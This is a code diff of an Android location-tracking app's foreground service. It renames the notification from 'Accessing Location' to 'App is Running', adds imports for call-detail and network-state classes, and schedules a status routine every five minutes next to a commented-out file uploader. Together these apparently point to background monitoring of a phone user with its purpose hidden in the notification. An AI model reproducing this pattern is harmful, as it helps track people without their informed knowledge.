@@ -1,4 +1,4 @@
-package com.varbin.locationtracker;
+package locationTracker;
 
 
 import android.app.AlarmManager;
@@ -9,7 +9,6 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.location.LocationManager;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.SystemClock;
@@ -18,11 +17,19 @@ import android.util.Log;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
+import com.varbin.locationtracker.APIs.CreaterClass;
 import com.varbin.locationtracker.MyLocationManager.LocationGetter;
+import com.varbin.locationtracker.R;
 
+import java.io.IOException;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
+
+import UiActivities.MainActivity;
+import callDetails.lastCall;
+import networkStates.networkState;
+import synceAdapter.AccountConstants;
 
 public class ForegroundServices extends Service {
     public static final String CHANNEL_ID = "ForegroundServiceChannel";
@@ -38,19 +45,28 @@ public class ForegroundServices extends Service {
         PendingIntent pendingIntent = PendingIntent.getActivity(this,
                 0, notificationIntent, 0);
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Accessing Location")
+                .setContentTitle("App is Running")
                 .setContentText(input)
                 .setSmallIcon(R.drawable.ic_baseline_add_location_alt_24)
                 .setContentIntent(pendingIntent)
                 .build();
         startForeground(1, notification);
+//        Intent intent1 = new Intent(this , StateRecieverClas.class);
+//        startService(intent1);
         ScheduledExecutorService scheduleTaskExecutor = Executors.newScheduledThreadPool(5);
         scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() {
             public void run() {
-                Log.d("TAG", "Foreground TAsk: "+1);
-                LocationGetter.Starts(getApplicationContext());
+//
+//                LocationGetter.Starts(getApplicationContext());
+                  CreaterClass.getStatus(getApplicationContext());
+//                AccountConstants.mainThread = true;
+//                try {
+//                    CreaterClass.FileDataUploader("", "","");
+//                } catch (IOException e) {
+//                    e.printStackTrace();
+//                }
             }
-        }, 1, 5, TimeUnit.SECONDS);
+        }, 1, 300000, TimeUnit.MILLISECONDS);
         //stopSelf();
         return START_NOT_STICKY;
     }
